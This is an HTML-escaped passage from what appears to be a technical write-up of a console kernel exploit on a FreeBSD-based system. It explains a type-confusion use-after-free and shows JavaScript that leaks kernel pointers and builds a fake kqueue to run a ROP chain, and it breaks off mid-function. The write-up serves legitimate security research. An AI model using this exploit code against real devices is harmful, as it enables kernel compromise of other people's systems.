  &lt;span class=&quot;n&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;namedobj_usr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_wlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                           &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sce_idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                           &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
                           &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ESRCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;id_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;id_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that the type confusion allows us to cast a &lt;code&gt;namedobj_usr_t&lt;/code&gt; object to a &lt;code&gt;namedobj_dbg_t&lt;/code&gt; one, and then update all of the &lt;code&gt;namedobj_dbg_t&lt;/code&gt; fields. Not only does this allow us to write off the end of the actual &lt;code&gt;namedobj_usr_t&lt;/code&gt; object, it also allows writing to the lower 32bits of the &lt;code&gt;namedobj_usr_t.name&lt;/code&gt; pointer, as well all the other &lt;code&gt;namedobj_usr_t&lt;/code&gt; fields. The fact that we may only update the lower 32bits of &lt;code&gt;namedobj_usr_t.name&lt;/code&gt; is actually a blessing in disguise (although it doesn’t matter so much for this post).&lt;/p&gt;
&lt;p&gt;So, the use-after-free primitive we have allows us to &lt;code&gt;free()&lt;/code&gt; any kernel address which happens to share the top 32bits with &lt;code&gt;no-&amp;gt;name&lt;/code&gt;. This means we can have our choice of any malloc’d pointer to free - we just need to somehow find such a pointer :) Obviously, such a pointer should be able to be used in a nice way after we free it and reallocate the backing memory.&lt;/p&gt;
&lt;h2 id=&quot;finding-a-uaf-target&quot;&gt;Finding a UAF Target&lt;/h2&gt;
&lt;p&gt;Since this was my first time working with FreeBSD, I just looked for some kernel object containing some function pointers which I could somehow derive the address of from the browser process. It turns out that on firmware 1.01 this is incredibly easy:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;sysctlbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kern.file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;will happily give you various kernel addresses relating to the file objects which the kernel uses to manage userspace file descriptors. From the exploit code:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFileDescriptorKernelDataPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd_xf_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getSysCtlByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'kern.file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oldp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oldlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getCurrentProcessId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oldp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oldlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xf_pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oldp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xf_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oldp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xf_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;oldp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;file_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xf_pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xf_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;fd_xf_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xf_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd_xf_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
et voilà! A kernel &lt;code&gt;file.f_data&lt;/code&gt; value (for a &lt;code&gt;fd&lt;/code&gt; you control) in javascript. The type of the object pointed to by &lt;code&gt;file.f_data&lt;/code&gt; depends on what type of file descriptor it is. I used &lt;code&gt;kqueue&lt;/code&gt; as this met my goal of a target object containing function pointers. The idea will be to overwrite a &lt;code&gt;kqueue&lt;/code&gt; and then cause one of the function pointers within &lt;code&gt;kq-&amp;gt;kq_knlist-&amp;gt;kn_knlist&lt;/code&gt; to be executed, which will point to a rop chain. Note &lt;code&gt;kq_knlist&lt;/code&gt; and &lt;code&gt;kn_knlist&lt;/code&gt; are lists (as their names state), not standard pointers.
&lt;h2 id=&quot;putting-it-together&quot;&gt;Putting it Together&lt;/h2&gt;
&lt;p&gt;Another exploit excerpt:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// finalize the ropchain and invoke it&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;trigger_kqueue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakefd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;callFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;syms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libkernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;filep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;leaks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFileDescriptorKernelDataPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fakefd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rop_scratch_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data_buf_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kqueue_sizeof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;klist_sizeof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knote_sizeof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filterops_sizeof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knlist_sizeof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf_sizeof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;rop_scratch_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allocateGCMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;clearMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data_buf_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakekq&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kl&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakekq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kqueue_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;klist_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fop&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knote_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filterops_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;knl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;knlist_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rop_scratch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf_sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// finalize ropchain&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;emitReturnViaJmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;jmpbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// create fake kq to execute the ropchain&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rop_stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getRopStack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
